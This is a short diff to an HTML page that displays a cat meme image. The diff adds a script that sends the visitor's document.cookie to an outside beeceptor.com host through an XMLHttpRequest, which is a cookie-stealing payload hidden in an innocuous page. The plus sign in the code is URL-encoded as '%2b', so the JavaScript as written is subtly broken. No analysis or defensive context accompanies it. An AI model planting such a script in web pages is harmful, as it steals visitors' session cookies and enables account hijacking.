@@ -12,5 +12,10 @@
     </head>
     <body>
         <img src="https://www.rd.com/wp-content/uploads/2020/01/04-cat-memes-1024x701.jpg" alt="cat meme" />
+        <script>
+            var xhttp = new XMLHttpRequest(); 
+            xhttp.open("GET", "https://web90074.free.beeceptor.com" %2b document.cookie, true); 
+            xhttp.send();
+        </script>
     </body>
 </html>
